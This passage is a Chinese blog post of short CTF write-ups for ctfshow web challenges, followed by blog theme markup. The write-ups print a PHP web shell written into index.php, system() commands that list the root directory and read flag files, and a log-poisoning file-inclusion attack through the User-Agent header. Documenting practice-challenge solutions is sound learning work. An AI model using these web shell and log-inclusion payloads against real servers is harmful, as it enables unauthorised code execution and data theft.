+<p>*web149<br> foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：<br> foreach (iterable_expression as $value)<br>   statement<br> foreach (iterable_expression as $key =&gt; $value)<br>   statement<br> unlink() 函数删除文件。<br> 第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。<br> 第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。<br> 注意 foreach 不会修改类似 current() 和 key() 函数所使用的数组内部指针。<br> 还能够自定义遍历对象。<br> 可以很容易地通过在 $value 之前加上 &amp; 来修改数组的元素。此方法将以引用赋值而不是拷贝一个值。<br> 先往index.php里面写get:?ctf=index.php post:show=<?php eval($_POST[1]);?><br> post:1=system(&apos;ls /&apos;);<br> post:1=system(&apos;cat /ctfshow_fl0g_here.txt&apos;);</p>
+<p>*web150<br> 定义和用法 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置<br> if($isVIP &amp;&amp; strrpos($ctf, “:”)===FALSE 不能有冒号<br> 这题可以重温下日志包含 web80<br> 这题先往UA写执行 然后get:?isVIP=true post//包含日志文件:ctf=/var/log/nginx/access.log&amp;1=phpinfo(); 看到有回显<br> 然后ctf=/var/log/nginx/access.log&amp;1=system(&apos;tac flag.php&apos;);</p>
+<p>*web120plus<br> 代码审计 其实autoload是独立的方法 ctfshow的类在上面已经结束了<br> 有个类判断 能控制 ——ctfshow—— 就能控制 $class 从而控制$class<br> 下划线被ban了 使用?..CTFSHOW..=xxx可以绕过正则匹配,利用空格 [ . +自动转换为_的特性<br> 我草 直接flag就在php里面</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/14/ctfshow%20web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lbj</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lbj</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
